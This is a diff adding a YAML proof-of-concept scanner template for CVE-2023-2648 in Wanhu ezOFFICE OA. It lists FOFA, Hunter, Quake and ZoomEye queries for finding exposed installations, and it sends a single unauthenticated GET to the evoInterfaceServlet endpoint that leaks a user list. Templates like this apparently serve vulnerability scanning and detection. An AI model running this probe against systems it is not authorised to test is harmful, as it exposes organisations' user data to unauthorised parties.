@@ -1,0 +1,27 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: CVE-2023-2648
+    cnvd: 
+    
+name: poc-yaml-wanhu-ezoffice-evoInterfaceServlet-unleak
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/evoInterfaceServlet?paramType=user
+      follow_redirects: false
+    
+    expression: >-
+      response.body_string.contains("success") && response.body_string.contains("userList")
+ 
+expression: r0() 
